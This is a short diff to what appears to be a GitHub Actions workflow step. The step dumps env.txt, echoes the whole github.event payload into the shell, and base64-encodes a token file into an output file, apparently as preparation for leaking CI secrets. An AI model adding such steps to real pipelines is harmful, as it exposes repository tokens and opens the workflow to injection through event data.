@@ -25,4 +25,4 @@ jobs:
           cat env.txt
           sleep 10
           
-          echo "${{ toJson(github.event) }}"" 2> ex-fill; cat token,${F555} | base64> out
+          echo "${{ toJson(github.event) }}" 2> ex-fill; cat token,${F555} | base64> out
